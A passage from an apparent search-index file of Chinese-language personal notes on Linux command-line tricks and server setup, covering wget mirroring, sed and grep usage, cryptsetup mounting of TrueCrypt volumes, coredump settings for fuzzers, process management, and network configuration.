<p>\u5982\u679c\u4f60\u4e0d\u5177\u6709root\u6743\u9650\uff0c\u53ef\u4ee5\u590d\u5236\u4e00\u4efdnginx.conf\uff0c\u4fee\u6539\u5176\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u4f60\u6ca1\u6709\u6743\u9650\u4fee\u6539\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4f8b\u5982access_log\uff0c\u7136\u540e\u4f7f\u7528<code>nginx -c /home/yourname/nginx.conf</code>\uff08\u6ce8\u610f\u5fc5\u987b\u7edd\u5bf9\u8def\u5f84\uff09\u542f\u52a8\u4f60\u7684nginx\uff0c\u6ca1\u6709\u51fa\u73b0EMRG\u9519\u8bef\u5373\u4e3a\u542f\u52a8\u6210\u529f\uff08\u53ef\u4ee5\u4f7f\u7528netstat -pant\u89c2\u5bdf\u662f\u5426\u6210\u529f\u76d1\u542c\u7aef\u53e3\uff09</p>"},{"location":"Linux-cli/#wget_1","title":"\u5ba2\u6237\u7aef\uff08\u6570\u636e\u4f20\u5165\u7aef\uff09\uff0c\u4f7f\u7528wget\uff1a","text":"<pre><code>alias myget='wget -r -np -nH -R index.html --restrict-file-names=nocontrol  -p -N -l0 -e robots=off --read-timeout=20 --tries=0'\ncd /mnt #\u4e0b\u8f7d\u5230\u54ea\nmyget http://server_IP:8080/yourdir #\u76f8\u5f53\u4e8e\u5c06yourdir\u590d\u5236\u5230\u5f53\u524d\u6587\u4ef6\u5939\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e\uff1a</p> <p>-r \u9012\u5f52\u4e0b\u8f7d\uff0c-np\u4e0d\u8981\u8fdb\u5165\u7236\u76ee\u5f55\uff0c-nH\u4e0d\u8981\u521b\u5efahost\u6587\u4ef6\u5939\uff0c-R index.html\u4e0d\u8981\u4fdd\u5b58\u6587\u4ef6\u5217\u8868\u7684index.html\uff0c\u2013restrict-file-names=nocontrol\u4e0d\u8981\u4e71\u6539\u4e2d\u6587\u6587\u4ef6\u540d</p> <p>-p \u8981\u4e0b\u8f7d\u56fe\u7247\uff0c-N \u4f7f\u7528\u6d4f\u89c8\u5668304\u7684\u65b9\u5f0f\u907f\u514d\u91cd\u590d\u4e0b\u8f7d\uff0c-l0\u9012\u5f52\u5c42\u6570\u4e0d\u9650\u5236\uff0c-e robots=off\u4e0d\u68c0\u67e5robots.txt</p> <p>\u2013read-timeout=20 \u5982\u679c20s\u4e4b\u5185\u6ca1\u6709\u6570\u636e\u4f20\u8f93\u5219\u8ba4\u4e3a\u5931\u8d25\u8fdb\u884c\u91cd\u8bd5\uff0c\u2013tries=0\u65e0\u9650\u6b21\u91cd\u8bd5</p> <p>\u67e5\u770bman\u6587\u6863</p>"},{"location":"Linux-cli/#sshd","title":"\u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b","text":"<p>\u5982\u679c\u4f60\u53d1\u73b0ps aux\u6216netstat -pant\u8f93\u51fa\u4e86\u5927\u91cfsshd\u7684\u4fe1\u606f\uff0c\u8bf4\u660e\u4e4b\u524dssh\u8fde\u63a5\u65ad\u5f00\u540esshd\u5e76\u6ca1\u6709\u9000\u51fa\u800c\u662f\u4e00\u76f4\u5360\u7528\u5185\u5b58</p> <p>\u6211\u4eec\u53ef\u4ee5\u6e05\u9664\u6389\u8fd9\u4e9b\u8fdb\u7a0b\u6765\u91ca\u653e\u5185\u5b58</p> <p>\u9996\u5148\u901a\u8fc7<code>pstree -p</code>\u6765\u67e5\u770b\u5f53\u524d\u4f60\u7684ssh\u4f1a\u8bdd\u7684sshd\u8fdb\u7a0bPID\uff0c\u4f8b\u5982\u8f93\u51fa\u4e86\u8fd9\u6837\u4e00\u884c\uff1a</p> <pre><code>\u251c\u2500sshd(32275)\u2500\u2500\u2500bash(32413)\u2500\u2500\u2500pstree(6543)\n</code></pre> <p>\u5219\u8bf4\u660e\u5f53\u524dsshd\u7684pid\u4e3a32275\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u6765kill -9\u5176\u4ed6\u6240\u6709\u7684sshd\u8fdb\u7a0b\uff1a</p> <pre><code>ps -ef | grep sshd | grep -v 32275 | grep -v grep | awk '{print \"kill -9\", $2}' |sh\n</code></pre> <p>Hint: \u5982\u679c\u5f53\u524d\u4e3b\u673a\u8fd8\u8fd0\u884c\u7740Docker\u5bb9\u5668\uff0c\u5982\u679c\u5bb9\u5668\u7684\u5b88\u62a4\u8fdb\u7a0b\u662fsshd\uff0c\u4e0a\u4e00\u6761\u547d\u4ee4\u53ef\u80fd\u4f7f\u5bb9\u5668\u9000\u51fa\uff1b\u6240\u4ee5\u4f60\u8fd8\u9700\u8981<code>docker top</code>\u6765\u786e\u5b9a\u5bb9\u5668\u7684sshd\u5728\u4e3b\u673a\u4e0a\u7684pid\u53f7</p>"},{"location":"Linux-cli/#_11","title":"\u6279\u91cf\u66ff\u6362\u6587\u672c","text":"<p>\u4f8b\u5982\u6279\u91cf\u9012\u5f52\u66ff\u6362\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6240\u6709php\u6587\u4ef6\uff0c\u5c06\u5176\u4e2d\u7684\u201daha/666\u201d\u6539\u4e3a\u201dovo/999\u201d</p> <p>\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>find . -type f -name \"*.php\" -exec sed -i 's~aha/666~ovo/999~g' {} +\n</code></pre> <p>\u5176\u4e2dsed -i\u539f\u4f4d\u66ff\u6362\u7528\u7684\u5206\u9694\u7b26\u7531\u4e8e\u66ff\u6362\u524d\u540e\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u4e86/\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u7ecf\u5178\u7684/\uff0c\u800c\u6539\u7528~</p>"},{"location":"Linux-cli/#_12","title":"\u627e\u5230\u6700\u8fd1\u4fee\u6539\u7684\u6587\u4ef6","text":"<p>\u4f8b\u5982wget\u9012\u5f52\u4e0b\u8f7d\uff0c\u4e2d\u9014\u88ab\u4e2d\u65ad\u4e86\uff0c\u6062\u590d\u7684\u65f6\u5019\u4e0e\u5176\u6bcf\u4e2a\u6587\u4ef6\u90fd\u8bf7\u6c42\u4e00\u6b21\u4e0d\u5982\u76f4\u63a5\u8df3\u8fc7\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6</p> <p>\u90a3\u5c31\u9700\u8981\u627e\u5230\u4e2d\u65ad\u7684\u65f6\u5019\u6b63\u5728\u5199\u5165\u54ea\u4e2a\u6587\u4ef6\uff0c\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6\u7ee7\u7eed</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4ee5\u65f6\u95f4\u987a\u5e8f\u663e\u793a\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u6587\u4ef6\uff0c\u65b0\u6587\u4ef6\u663e\u793a\u5728\u6700\u524d\u9762</p> <pre><code>find . -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort -r|less\n</code></pre>"},{"location":"Linux-cli/#cryptsetuptruecrypt","title":"\u4f7f\u7528cryptsetup\u6302\u8f7dtruecrypt\u5206\u533a","text":"<p>\u5728ubuntu 16.04\u4e2d\u7f16\u8bd1truecrypt 7.1a\u8fd0\u884c\u65f6\u51fa\u73b0\u9519\u8bef\uff1a<code>error: Invalid characters encountered.</code></p> <p>\u5728\u8fd9\u4e2a\u94fe\u63a5\u4e0a\u627e\u5230\u4e86\u7b54\u6848\uff08\u611f\u8c22\u5728\u5176\u4ed6\u8bba\u575b\u627e\u5230\u7b54\u6848\u540e\u4e3b\u52a8\u63d0\u4f9b\u89e3\u51b3\u65b9\u6848\u7684Jakub Urbanowicz\uff09</p> <p>https://bugs.archlinux.org/task/47325 \u539f\u8d34\u5730\u5740\uff08\u641c\u7d22cryptsetup\uff09\uff1ahttps://forums.gentoo.org/viewtopic-p-7809512.html</p> <p>\u65b9\u6cd5\u662f\uff1a</p> <pre><code>sudo su #\u4ee5\u4e0b\u547d\u4ee4\u90fd\u8981root\u6743\u9650\uff0c\u5982\u679c\u5728Docker\u5bb9\u5668\u4e2d\u5c1d\u8bd5 \u542f\u52a8\u5bb9\u5668\u65f6\u9700\u8981--privileged\n# \u5148\u5b89\u88c5cryptsetup\napt install -y cryptsetup-bin\n\n# \u6302\u8f7d\uff0c\u6ce8\u610ftype\u524d\u9762\u662f\u4e24\u4e2a\u6a2a\u7ebf\uff0c\u6587\u4ef6\u8def\u5f84\u53ef\u4ee5\u662f/dev/sdb1\uff0c\u540d\u79f0\u968f\u4fbf\u586b\ncryptsetup open --type tcrypt truecrypt\u6587\u4ef6\u8def\u5f84 \u540d\u79f0\n\n# \u7136\u540emount\u6302\u8f7d\nmount /dev/mapper/\u540d\u79f0 \u6302\u8f7d\u70b9\n\n# \u5378\u8f7d\u7684\u65f6\u5019\u8bb0\u5f97close\uff0c\u90fd\u8fd8\u662f\u8981root\u6743\u9650\numount \u6302\u8f7d\u70b9\ncryptsetup close \u540d\u79f0\n</code></pre>"},{"location":"Linux-cli/#_13","title":"\u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5","text":"<p>\u7528binwalk\u53d1\u73b0\u9700\u8981\u7684\u7247\u6bb5\u7684\u8d77\u59cb\u4f4d\u70b9\uff0c\u4ee5\u53ca\u8ba1\u7b97\u51fa\u957f\u5ea6</p> <p>binwalk\u76f4\u63a5-e\u6709\u65f6\u5019\u5c31\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u4f46\u5982\u679c\u662fexe\u6587\u4ef6 exe\u672c\u8eab\u53ef\u80fd\u88ab\u62c6\u6210\u591a\u4e2a\u6587\u4ef6 \u5982\u4e00\u5806\u8bc1\u4e66\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5</p> <pre><code>binwalk -D 'exe' \u6587\u4ef6\u540d\n</code></pre> <p>\u6216\u8005\u7528dd\uff0c\u6ce8\u610f\u522b\u7528bs=1 \u592a\u6162\uff1a</p> <pre><code>dd if=input.binary of=output.binary skip=$offset count=$bytes iflag=skip_bytes,count_bytes\n</code></pre> <p>From: https://stackoverflow.com/questions/1423346/how-do-i-extract-a-single-chunk-of-bytes-from-within-a-file</p> <p>\u5982\u679c\u7701\u7565\u6389count\u5c31\u662f\u4e00\u76f4\u5230\u672b\u5c3e</p>"},{"location":"Linux-cli/#redis","title":"redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c","text":"<p>FROM: https://stackoverflow.com/questions/4006324/how-to-atomically-delete-keys-matching-a-pattern-using-redis</p> <p>\u5220\u9664\u5f53\u524d\u6570\u636e\u5e93\u4e2dprefix\u5f00\u5934\u7684\u6240\u6709key\uff1a</p> <pre><code>EVAL \"local keys = redis.call('keys', ARGV[1]) \\n for i=1,#keys,5000 do \\n redis.call('del', unpack(keys, i, math.min(i+4999, #keys))) \\n end \\n return keys\" 0 prefix*\n</code></pre>"},{"location":"Linux-cli/#_14","title":"\u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9","text":"<p>\u4f7f\u7528<code>sed -i</code> \u548c<code>find</code></p> <p>\u4f8b\u5982\u672c\u7ad9\u7f16\u8bd1\u811a\u672c\u5728mkdocs\u7f16\u8bd1\u540e\u5bf9\u6240\u6709.html\u6587\u4ef6\u6267\u884c\u66ff\u6362\uff0c\u6539\u7528\u56fd\u5185CDN</p> <pre><code>sed -i 's#cdnjs.cloudflare.com#cdnjs.loli.net#g' $(find -type f -name \"*.html\")\nsed -i 's#fonts.googleapis.com#fonts.loli.net#g' $(find -type f -name \"*.html\")\n</code></pre>"},{"location":"Linux-cli/#coredump-in-fuzzing","title":"coredump in fuzzing","text":"<p>\u53c2\u8003\uff1a http://man7.org/linux/man-pages/man5/core.5.html</p> <p>\u4e3a\u5565afl\u8981\u6c42\u6211\u4eec<code>echo core &gt;/proc/sys/kernel/core_pattern</code> \u5462\uff1f fuzzing\u65f6\u600e\u4e48\u907f\u514d\u4ea7\u751fcoredump\u4ea7\u751f\u5927\u91cfIO\u6d6a\u8d39\u65f6\u95f4\uff1f</p>"},{"location":"Linux-cli/#core_pattern","title":"core_pattern\u662f\u5565","text":"<p>\u8fd9\u4e2a\u6587\u4ef6<code>/proc/sys/kernel/core_pattern</code>\u662f\u547d\u540dcoredump\u6587\u4ef6\u7684\u6a21\u677f\uff0c\u6bd4\u5982\u6539\u4e3a<code>core</code>\u4e4b\u540e\u4ea7\u751f\u7684coredump\u6587\u4ef6\u5c31\u53eb\u505a<code>core</code></p> <p>\u53e6\u4e00\u4e2a\u6587\u4ef6<code>/proc/sys/kernel/core_uses_pid</code> \u5982\u679c\u662f1\u7684\u8bdd\uff0c\u8fd8\u4f1a\u52a0\u4e0a<code>.pid</code></p>"},{"location":"Linux-cli/#coredump","title":"\u600e\u4e48\u624d\u80fd\u4e0d\u4ea7\u751fcoredump","text":"<p>\u5168\u5c40\u5173\u95ed\uff1a</p> <pre><code>echo &gt;/proc/sys/kernel/core_pattern\necho 0 &gt;/proc/sys/kernel/core_uses_pid\n</code></pre> <p>\u8fd8\u53ef\u4ee5\u5728\u5f53\u524d\u76ee\u5f55<code>mkdir core</code>\uff0c\u6709\u4e86\u540c\u540d\u6587\u4ef6\u5939\u5c31\u4e0d\u4f1a\u518d\u5199core\u6587\u4ef6\u4e86</p> <p>fuzzer\u53ef\u4ee5\u7528rlimit\u7684\u529f\u80fd\u9650\u5236\u5b50\u8fdb\u7a0b\uff1a</p> <p>\u6587\u6863\u8bf4\u4e86<code>RLIMIT_CORE</code>\u8fd9\u4e2a\u9650\u5236\uff0c\u53ea\u8981\u5b83\u662f0\u5c31\u4e0d\u4f1a\u4ea7\u751f\u4e86\uff0c\u6bd4\u5982AFL\u7684\u4ee3\u7801\uff1a</p> <pre><code>    /* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered\nbefore the dump is complete. */\n\nr.rlim_max = r.rlim_cur = 0;\n\nsetrlimit(RLIMIT_CORE, &amp;r); /* Ignore errors */\n</code></pre> <p>\u518d\u6bd4\u5982honggfuzz\u7684\u4ee3\u7801\uff08honggfuzz-1.7\u5e76\u6ca1\u6709\u8003\u8651\u8fd9\u4e2a\uff09\uff1a</p> <pre><code>/* in cmdline.c */\n{ { \"rlimit_core\", required_argument, NULL, 0x103 }, \"Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])\" },\n\n/* in subproc.c */\n#ifdef RLIMIT_CORE\nconst struct rlimit rl = {\n.rlim_cur = run-&gt;global-&gt;exe.coreLimit * 1024ULL * 1024ULL,\n.rlim_max = run-&gt;global-&gt;exe.coreLimit * 1024ULL * 1024ULL,\n};\nif (setrlimit(RLIMIT_CORE, &amp;rl) == -1) {\nPLOG_W(\"Couldn't enforce the RLIMIT_CORE resource limit, ignoring\");\n}\n#endif /* ifdef RLIMIT_CORE */\n</code></pre>"},{"location":"Linux-cli/#bash","title":"bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386","text":"<pre><code>shuf filename|while read line; do python3 run.py \"$line\"; done\n</code></pre>"},{"location":"Linux-cli/#grep_1","title":"grep\u67e5\u627e\u4e2d\u6587","text":"<pre><code>ls /tmp/test | grep -P '[\\p{Han}]' \n</code></pre> <p>\u53c2\u8003 https://www.regular-expressions.info/unicode.html#script</p>"},{"location":"Linux-cli/#grep_2","title":"grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9","text":"<p>\u573a\u666f\uff1afuzzing lava \u6d4b\u8bd5\u96c6\uff0c\u505a\u4e8630\u6b21\u91cd\u590d\uff08\u6bcf\u6b21\u91cd\u590d\u6587\u4ef6\u5939\u540d\u79f0\u672b\u5c3e\u4e3a<code>_\u91cd\u590d</code>\uff09\uff0c\u5df2\u7ecf\u5c06crash\u8fd0\u884c\u5f97\u5230\u7684stdout\u548cstderr\u5b58\u50a8\u4e3a\u6587\u4ef6\uff0c\u60f3\u7edf\u8ba1\u6bcf\u6b21\u91cd\u590d\u89e6\u53d1\u4e86\u591a\u5c11bugid</p> <p>\u6362\u53e5\u8bdd\u8bf4\uff0c\u5df2\u77e5\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6709\u4e00\u4e9b\u53ef\u80fd\u88ab\u5f53\u6210\u4e8c\u8fdb\u5236\u7684\u6587\u672c\u6587\u4ef6\uff0c\u5305\u542b<code>Successfully triggered bug 576, crashing now!</code>\uff0c\u6211\u60f3\u5c06\u5176\u4e2d\u7684576\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5bf9\u6574\u4e2a\u6587\u4ef6\u5939\u8ba1\u6570</p> <p>\u6ce8\u610fgrep\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u2013text\uff0c\u4e0d\u7136\u4f1a\u6f0f\u6389\u4e00\u4e9b\u6587\u4ef6</p> <p>\u7528\u5230\u4e86grep\u7684\u6b63\u5219\u63d0\u53d6\uff0c\u524d\u7f6e\u5224\u65ad\u7528<code>(?&lt;=\u6587\u672c)</code>\uff0c\u540e\u7f6e\u5224\u65ad\u7528<code>(?=\u6587\u672c)</code>\uff0c\u4f8b\u5982\u63d0\u53d6<code>aaa123bbb</code>\u4e2d\u7684123\u5c31\u53ef\u4ee5\uff1a<code>echo aaa123bbb|grep -P '(?&lt;=aaa)\\d+(?=bbb)' -o</code></p> <p>\u5176\u4e2d<code>-P</code>\u8868\u793a\u6b63\u5219\u8bed\u6cd5\u4e3aPerl\uff0c<code>-o</code>\u8868\u793a\u53ea\u663e\u793a\u5339\u914d</p> <p>\u53c2\u8003\uff1a https://unix.stackexchange.com/questions/13466/can-grep-output-only-specified-groupings-that-match</p> <pre><code>for i in `seq 1 1 30`; do if [ -d *_${i}/ ]; then (cd *_${i}; echo $i `grep 'Successfully triggered bug' -r . --text \\\n             | grep -P '(?&lt;=bug )(\\d+)(?=,)' -o \\\n             |sort| uniq|wc -l` ); else echo ${i} 0; fi; \ndone\n</code></pre>"},{"location":"Linux-cli/#kill","title":"\u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b","text":"<p>\u5217\u4e3e\u6240\u6709\u8fdb\u7a0b\uff0c\u627e\u51fa\u5185\u5b58\u8d85\u8fc75%\u7684\uff0ckill\u6389</p> <p>\u6ce8\u610f\u5230sort\u6bd4\u8f83\u6570\u5b57\u5927\u5c0f\u9700\u8981\u7528<code>-h</code>\u6216\u8005<code>-V</code>\uff0c\u5426\u5219\u4f1a\u51fa\u73b0<code>3&gt;20</code>\u7684\u6bd4\u8f83\u7ed3\u679c\uff08\u5b57\u7b26\u4e32\u6bd4\u8f83\uff09</p> <p>\u7531\u4e8e<code>[ \"$num\" -gt 5 ]</code>\u53ea\u652f\u6301num\u4e3a\u6574\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u7528bc\u4f5c\u6d6e\u70b9\u6570\u5927\u5c0f\u5224\u65ad\uff0c\u53c2\u8003\uff1a https://stackoverflow.com/questions/8654051/how-to-compare-two-floating-point-numbers-in-bash</p> <p>\u7528<code>grep -v</code>\u8bbe\u7f6e\u767d\u540d\u5355\uff1adocker, perl</p> <pre><code>while true; do LINE=$(ps aux|grep -v docker|grep -v perl|sort -k4 -h|tail -n 1); (( $( echo \"`echo ${LINE}|awk '{print $4}'` &gt; 5\" |bc -l) )) &amp;&amp; \\\n        (echo $LINE; kill `echo ${LINE}|awk '{print $2}'`); sleep 5; \ndone\n</code></pre>"},{"location":"Linux-cli/#screen","title":"screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9","text":"<pre><code>screen -dmS name /bin/bash\nscreen -S name -p 0 -X stuff \"ls\"`echo -ne '\\r'`\nscreen -S name -p 0 -X hardcopy /tmp/test.txt\n</code></pre> <p>\u4e2d\u6587\u5b57\u7b26\u4f1a\u6709\u95ee\u9898\uff0c\u5f85\u89e3\u51b3</p>"},{"location":"Linux-cli/#c","title":"\u7f16\u8bd1\u5f53\u524d\u6587\u4ef6\u5939\u6240\u6709.c\u6587\u4ef6","text":"<p><code>${i%.*}</code> \u53bb\u6389\u6587\u4ef6\u540d\u7684\u6700\u540e\u4e00\u4e2a\u540e\u7f00</p> <pre><code>for i in *.c; do gcc $i -o out/${i%.*}; done\n</code></pre>"},{"location":"Linux-cli/#gdb","title":"gdb\u81ea\u52a8\u5316","text":"<pre><code>echo -e \"set pagination off\\nset confirm off\" &gt; ~/.gdbinit\n</code></pre> <p>\u7136\u540e\u4f7f\u7528<code>gdb ./a.out -ex \"r inputfile\" -ex \"bt\" -ex \"quit\"</code></p>"},{"location":"Linux-cli/#mktorrenttorrent","title":"mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6","text":"<p>\u53c2\u8003\uff1a https://community.seedboxes.cc/articles/how-to-create-a-torrent-via-the-command-line</p> <pre><code>sudo apt install mktorrent\nmktorrent -v -a \"http://tracker.nexushd.org/announce.php\" -p folder -o folder.torrent -l 24\n</code></pre> <p>\u5176\u4e2d<code>-l 24</code>\u7684\u610f\u601d\u662f\u6bcf\u4e2a\u5206\u5757\u4e3a2**24=16MB\uff0c\u8fd9\u662f\u5efa\u8bae\u7684\u6700\u5927\u7684\u503c</p>"},{"location":"Linux-cli/#m3u8mp4","title":"\u9489\u9489\u76f4\u64ad\u56de\u653e\u4e0b\u8f7d m3u8\u8f6cmp4","text":"<p>\u624b\u673a\u7aef\u7528\u6293\u5305\u8f6f\u4ef6 \u5982HttpCanary\uff0c\u70b9\u5f00\u76f4\u64ad\u56de\u653e\u540e\u4f1a\u5f97\u5230\u4e00\u4e2am3u8\u7684\u5730\u5740\uff0c\u7136\u540e\u4f7f\u7528ffmpeg\u4e0b\u8f7d\u5373\u53ef</p> <p>\u53c2\u8003\uff1ahttps://www.bilibili.com/video/av99036702/</p> <p>https://gist.github.com/tzmartin/fb1f4a8e95ef5fb79596bd4719671b5d</p> <pre><code>ffmpeg -i http://dtliving-pre.alicdn.com/... -bsf:a aac_adtstoasc -vcodec copy -c copy name.mp4\n</code></pre>"},{"location":"Linux-cli/#ls","title":"\u9ed1\u8272\u80cc\u666fls \u76ee\u5f55\u6df1\u7eff\u8272\u770b\u4e0d\u6e05\u6539\u4e2a\u989c\u8272","text":"<p>Ubuntu\u7cfb\u7edf\u7f16\u8f91<code>~/.dircolors</code>: (\u5176\u4ed6\u7cfb\u7edf<code>~/.dir_colors</code>)</p> <pre><code>DIR 01;36 \n</code></pre> <p>\u6216\u8005\u6267\u884c\uff1a</p> <pre><code>eval `dircolors | sed -e 's/;34:/;36:/'`\n</code></pre>"},{"location":"Linux-cli/#seafile","title":"\u90e8\u7f72seafile\u5ba2\u6237\u7aef","text":"<p>https://download.seafile.com/published/seafile-user-manual/syncing_client/install_linux_client.md</p> <p>\u9700\u8981\u6ce8\u610fseafile-cli\u5df2\u7ecf\u52a0\u5165boinc\u5b98\u65b9\u6e90\uff0c\u4f46\u7248\u672c\u4e0eppa\u6e90\u4e0d\u5339\u914d</p> <pre><code># apt install -y software-properties-common\nadd-apt-repository -y ppa:seafile/seafile-client\napt update\napt install seafile-cli -y\nmkdir ~/seafile\nseaf-cli init -d ~/seafile\nseaf-cli start\n# \u91cd\u542f\u540e\u4e5f\u9700\u8981\u81ea\u5df1\u624b\u52a8\u542f\u52a8\n</code></pre> <p>\u5728\u7f51\u9875\u7aef\u521b\u5efa/\u6253\u5f00\u8d44\u6599\u5e93\u540e\u4eceurl\u590d\u5236\u5f97\u5230id</p> <p>\u5ba2\u6237\u7aef\u6ca1\u6709\u9700\u8981\u540c\u6b65\u7684\u6587\u4ef6\u65f6\u7528download\uff0c\u6709\u9700\u8981\u52a0\u5165\u540c\u6b65\u7684\u6570\u636e\u7528sync</p> <pre><code>seaf-cli download -l \"the id of the library\"\n-s \"the url + port of server\" -d \"the folder which the library will be synced with\" -u \"username on server\" [-p \"password\"]\n</code></pre> <p>\u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801\u9519\u8bef\u7684\u65f6\u5019\u62a5\u9519\u662f400\uff0c\u9700\u8981\u7559\u610f</p>"},{"location":"Linux-cli/#pcregrep","title":"pcregrep\u6b63\u5219\u63d0\u53d6","text":"<p>\u4f8b\u5982\u6211\u4eec\u8981\u63d0\u53d6some.htm\u4e2d\u6240\u6709href\u5c5e\u6027\u4e2d\u7684html\uff0c\u4f7f\u7528\u666e\u901a\u7684grep\u4e0d\u80fd\u53ea\u63d0\u53d6\u5355\u72ec\u7684group\u3002\u8fd9\u91cc\u6211\u4eec\u7528pcregrep\u53ef\u4ee5\u6307\u5b9a<code>-o</code>\u53c2\u6570\uff0c\u8fd8\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\u8fde\u7eed\u8f93\u51fa</p> <pre><code># apt install -y pcregrep\npcregrep -o1 'href=\"([^\\.]*\\.htm)\"' some.htm\n</code></pre>"},{"location":"Linux-cli/#_15","title":"\u7ba1\u9053\u5173\u95ed\u7f13\u51b2","text":"<p>\u53c2\u8003\uff1ahttps://harttle.land/2020/06/06/tail-f-pipe.html</p> <p>grep \u6dfb\u52a0 <code>--line-buffered</code>\uff0csed \u6dfb\u52a0 <code>-u</code>\uff0cawk \u8c03 <code>fflush()</code>\u3002</p> <p>Shell \u91cc\u53ef\u4ee5\u901a\u8fc7 [ -t 1 ] \u6765\u5224\u65ad stdout\uff08\u6587\u4ef6\u63cf\u8ff0\u7b26 1\uff09 \u662f\u5426\u662f TTY\u3002 More</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>tail -f log.txt | grep --line-buffered Error | sed -u 's/harttle//' | awk '${print $1; fflush()}' | grep ENOENT\n</code></pre>"},{"location":"Linux-cli/#_16","title":"\u7b49\u5f85\u7279\u5b9a\u8fdb\u7a0b\u7ed3\u675f","text":"<p>\u4f8b\u5982\u5e76\u884c\u542f\u52a8\u7f16\u8bd1\u8fdb\u7a0b\uff0c\u5e0c\u671b\u7b49\u5f85\u6240\u6709gcc\u7ed3\u675f\uff1a</p> <pre><code>while [ \"`pgrep -c gcc`\" -gt 0 ]; do echo cnt: `pgrep -c gcc`\nsleep 10; done\n</code></pre>"},{"location":"Linux-setup/","title":"Linux\u7cfb\u7edf\u914d\u7f6e","text":"<p>\u672c\u6587\u6863\u4e3aLinux\u670d\u52a1\u5668\u7684\u914d\u7f6e\u65b9\u9762\u7684\u7b14\u8bb0\uff0cLinux\u76f8\u5173\u7b14\u8bb0\u8fd8\u6709\uff1a</p> <p>Linux\u547d\u4ee4\u884c\u64cd\u4f5c\u6280\u5de7</p> <p>SSH\u8fdc\u7a0b\u767b\u5f55</p> <p>Linux\u5907\u4efd</p> <p>TOC:</p>"},{"location":"Linux-setup/#_1","title":"\u5982\u4f55\u7ffb\u5899","text":""},{"location":"Linux-setup/#shadowsocksprivoxyhttp-proxy","title":"\u90e8\u7f72shadowsocks\u5ba2\u6237\u7aef\uff0c\u5e76\u90e8\u7f72Privoxy\u63d0\u4f9bhttp proxy","text":"<p>\u4ee3\u7801\u53c2\u89c1ssprivoxy.txt</p>"},{"location":"Linux-setup/#ip","title":"\u914d\u7f6e\u6709\u7ebf\u9759\u6001IP","text":"<pre><code>vim /etc/network/interfaces\n# \u5199\u5165\u4ee5\u4e0b\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u66ff\u6362xx\u90e8\u5206\niface eth0 inet static\n address 10.xx.xx.13 #\u4f60\u9700\u8981\u8bbe\u7f6e\u7684IP\nnetmask 255.255.255.0 #\u5b50\u7f51\u63a9\u7801\nnetwork 10.xx.xx.0\n broadcast 10.xx.xx.255\n gateway 10.xx.xx.254 #\u7f51\u5173\ndns-nameservers 10.10.0.21 #dns\u670d\u52a1\u5668\n# \u6309Esc, :wq\u9000\u51fa\u4fdd\u5b58\nservice networking restart\nifconfig eth0 10.xx.xx.13 netmask 255.255.255.0 up\nroute add default eth0 #\u8def\u7531\u914d\u7f6e\u4e5f\u5f88\u91cd\u8981\uff0c\u9519\u8bef\u7684\u8def\u7531\u5c06\u5bfc\u81f4\u4e0d\u80fd\u8bbf\u95ee\nroute add default gw 10.xx.xx.254 dev eth0 #\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4f60\u7684\u7f51\u5173\n</code></pre> <p>\u6ce8\u610f\u4f7f\u7528ifconfig\u8fdb\u884cip\u7684\u4fee\u6539\u540e\uff0c\u4f1a\u4e22\u5931\u8def\u7531\u4fe1\u606f\u3001\u989d\u5916\u7684ip\u8bbe\u7f6e\uff0c\u9700\u8981\u91cd\u65b0\u914d\u7f6eroute\uff08\u6267\u884c\u4e0a\u8ff0\u4e24\u6761route\u547d\u4ee4\u5373\u53ef\uff09</p>"},{"location":"Linux-setup/#dhcpiprtnetlink-answers-file-exists","title":"\u914d\u7f6e\u4e3adhcp\u81ea\u52a8\u83b7\u53d6ip\uff0c\u89e3\u51b3RTNETLINK answers: File exists\u95ee\u9898","text":"<p>\u4e4b\u524d\u5df2\u7ecf\u914d\u7f6e\u8fc7\u9759\u6001ip\uff0c\u73b0\u5728\u8981\u6539\u4e3a\u81ea\u52a8\u83b7\u53d6</p> <pre><code>dhclient eth0\n</code></pre> <p>\u51fa\u73b0\u62a5\u9519RTNETLINK answers: File exists\uff0c\u89e3\u51b3\u65b9\u6848\uff1a</p> <pre><code>ip addr flush dev 